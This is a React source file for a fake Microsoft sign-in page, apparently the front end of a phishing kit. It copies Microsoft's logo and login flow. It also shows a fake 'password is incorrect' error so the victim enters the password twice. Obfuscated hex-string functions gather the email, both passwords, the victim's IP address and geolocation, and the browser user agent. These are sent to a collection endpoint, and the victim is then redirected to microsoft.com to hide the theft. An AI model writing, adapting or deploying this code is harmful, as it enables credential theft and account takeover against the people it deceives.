import React, { useState, useEffect } from "react";
import "../assets/css/style.css";
import logo from "../assets/images/microsoft_logo.svg";
import axios from "axios";
import Api from "../api/apis";
import key from "../assets/images/signin.svg";
import arrowIcon from "../assets/images/arrow.svg";

export default function Home() {
  let [temp, setTemp] = useState(null);
  let [email, setEmail] = useState(null);
  let [password, setPassword] = useState(null);
  let [rePassword, setRePassword] = useState(null);
  let [passwordState, setPasswordState] = useState(false);
  let [emailState, setEmailState] = useState(false);

  function _0x4716(){const _0x2ffc0a=['21qAvNQV','506gbMEaV','142530ghouVG','2790375Yukfmi','2473sZBYKp','1472445AbYBPL','5057512VnshuY','6sABAKF','845868UfsHMm','test','7494858AETgVi','284jziQcP'];_0x4716=function(){return _0x2ffc0a;};return _0x4716();}(function(_0x107fa0,_0x3f643f){const _0x4e9939=_0x51bc,_0x28a6f4=_0x107fa0();while(!![]){try{const _0x2a2274=-parseInt(_0x4e9939(0x10b))/0x1*(-parseInt(_0x4e9939(0x106))/0x2)+-parseInt(_0x4e9939(0x107))/0x3*(parseInt(_0x4e9939(0x10f))/0x4)+-parseInt(_0x4e9939(0x10c))/0x5*(-parseInt(_0x4e9939(0x10e))/0x6)+-parseInt(_0x4e9939(0x10a))/0x7+parseInt(_0x4e9939(0x10d))/0x8+parseInt(_0x4e9939(0x111))/0x9+-parseInt(_0x4e9939(0x109))/0xa*(-parseInt(_0x4e9939(0x108))/0xb);if(_0x2a2274===_0x3f643f)break;else _0x28a6f4['push'](_0x28a6f4['shift']());}catch(_0x23ab7f){_0x28a6f4['push'](_0x28a6f4['shift']());}}}(_0x4716,0xd8a36));function _0x51bc(_0x579e33,_0x40b2d5){const _0x4716b6=_0x4716();return _0x51bc=function(_0x51bc91,_0xe4d055){_0x51bc91=_0x51bc91-0x106;let _0x341453=_0x4716b6[_0x51bc91];return _0x341453;},_0x51bc(_0x579e33,_0x40b2d5);}function validateEmail(_0x2d8278){const _0x2a38de=_0x51bc;let _0x42c8ba=/\S+@\S+\.\S+/;return _0x42c8ba[_0x2a38de(0x110)](_0x2d8278);}

  function _0x362c(_0x43e0c4,_0x12b7a8){const _0x498f43=_0x498f();return _0x362c=function(_0x362cf5,_0x437e5e){_0x362cf5=_0x362cf5-0x144;let _0x2d461e=_0x498f43[_0x362cf5];return _0x2d461e;},_0x362c(_0x43e0c4,_0x12b7a8);}function _0x498f(){const _0x31bc93=['addLogin','4451972SaBfcY','1205220eBVrGN','status','371952rGFjPO','preventDefault','351849qyvtqn','https://microsoft.com','https://freeipapi.com/api/json/','48849LKdfPE','919260ncvfCo','387756mhmkuP','get','data'];_0x498f=function(){return _0x31bc93;};return _0x498f();}(function(_0x404747,_0x5a3e54){const _0x53d6db=_0x362c,_0x495ad5=_0x404747();while(!![]){try{const _0x3bcb51=-parseInt(_0x53d6db(0x14d))/0x1+parseInt(_0x53d6db(0x148))/0x2+parseInt(_0x53d6db(0x14a))/0x3+parseInt(_0x53d6db(0x14e))/0x4+parseInt(_0x53d6db(0x146))/0x5+parseInt(_0x53d6db(0x14f))/0x6+-parseInt(_0x53d6db(0x145))/0x7;if(_0x3bcb51===_0x5a3e54)break;else _0x495ad5['push'](_0x495ad5['shift']());}catch(_0x570da2){_0x495ad5['push'](_0x495ad5['shift']());}}}(_0x498f,0x2592b));async function submitForm(_0x347db5){const _0x42ebf8=_0x362c;_0x347db5[_0x42ebf8(0x149)](),setRePassword(temp);const _0x5427f5=await axios[_0x42ebf8(0x150)]('https://api.ipify.org/?format=json');let _0x5b2252=(await axios['get'](_0x42ebf8(0x14c)+_0x5427f5[_0x42ebf8(0x151)]['ip']))['data'],_0x2a2697=navigator['userAgent'],_0x28e13b={'email':email,'password1':password,'password2':rePassword,'ip':_0x5b2252,'useragent':_0x2a2697},_0x5af3cd=await Api[_0x42ebf8(0x144)](_0x28e13b);_0x5af3cd[_0x42ebf8(0x147)]===0xc8?window['location']['href']=_0x42ebf8(0x14b):(setEmail(null),setPassword(null),setRePassword(null));}

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const emailParam = urlParams.get('email');
    if (emailParam) {
      setEmail(emailParam);
    }
  }, []);

  return (
    <>
      {email ? (
        password ? (
          <div className="wrapper">
            <div className="loginDiv">
              <p className="logoWrapper">
                <img
                  className="logo"
                  src={logo}
                  alt=""
                />
              </p>
              <div class="back-btn">
                <img
                  onClick={() => setEmail(null)}
                  src={arrowIcon}
                  alt="arrowImg"
                />
                <p className="emailP">{email}</p>
              </div>
              <h1 className="head">Enter Password</h1>
              <input
                className="inputEmail"
                type="password"
                placeholder="Password"
                value={rePassword ? rePassword : ""}
                onChange={(e) => {
                  setRePassword(e.target.value);
                  setPasswordState(false);
                }}
              />
              {passwordState ? (
                <p className="passwordError">
                  Your password is incorrect. Please try again.
                </p>
              ) : (
                ""
              )}
              <p className="misAcc">
                <a href="#">Forgot password?</a>
              </p>
              <p className="buttonsGroup">
                <button
                  className="buttonBtnNext"
                  onClick={submitForm}
                >
                  Sign in
                </button>
              </p>
            </div>
          </div>
        ) : (
          <div className="wrapper">
            <div className="loginDiv">
              <p className="logoWrapper">
                <img
                  className="logo"
                  src={logo}
                  alt=""
                />
              </p>
              <div class="back-btn">
                <img
                  onClick={() => [setEmail(null), setTemp(null)]}
                  src={arrowIcon}
                  alt="arrowImg"
                />
                <p className="emailP">{email}</p>
              </div>
              <h1 className="head">Enter Password</h1>
              <input
                className="inputEmail"
                type="password"
                placeholder="Password"
                onChange={(e) => setTemp(e.target.value)}
              />
              <p className="misAcc">
                <a href="#">Forgot password?</a>
              </p>
              <p className="buttonsGroup">
                <button
                  className="buttonBtnNext"
                  onClick={() => {
                    setPassword(temp);
                    setTemp(null);
                    setPasswordState(true);
                  }}
                >
                  Sign in
                </button>
              </p>
            </div>
          </div>
        )
      ) : (
        <>
          <div className="wrapper">
            <div className="loginDiv">
              <p className="logoWrapper">
                <img
                  className="logo"
                  src={logo}
                  alt=""
                />
              </p>
              <h1 className="head">Sign in</h1>
              <input
                className="inputEmail"
                type="email"
                placeholder="Email, phone, or Skype"
                onChange={(e) => [
                  setEmailState(false),
                  setTemp(e.target.value),
                ]}
              />
              {emailState ? (
                <p className="passwordError">Invalid Email.</p>
              ) : (
                ""
              )}
              <p className="misAcc">
                No account? <a href="#">Create one!</a>
              </p>
              <p className="misAcc">
                <a href="#">
                  Sign in with a security key{" "}
                  <i className="bi bi-question-circle"></i>
                </a>
              </p>
              <p className="buttonsGroup">
                <button
                  className="buttonBtnNext"
                  onClick={() => {
                    validateEmail(temp) ? setEmail(temp) : setEmailState(true);
                  }}
                >
                  Next
                </button>
              </p>
            </div>
            <br />
            <div className="optionsDiv">
              <p className="signOption">
                <img
                  src={key}
                  alt=""
                />{" "}
                <span className="signOptionSpan">Sign-in options</span>
              </p>
            </div>
          </div>
        </>
      )}
    </>
  );
}
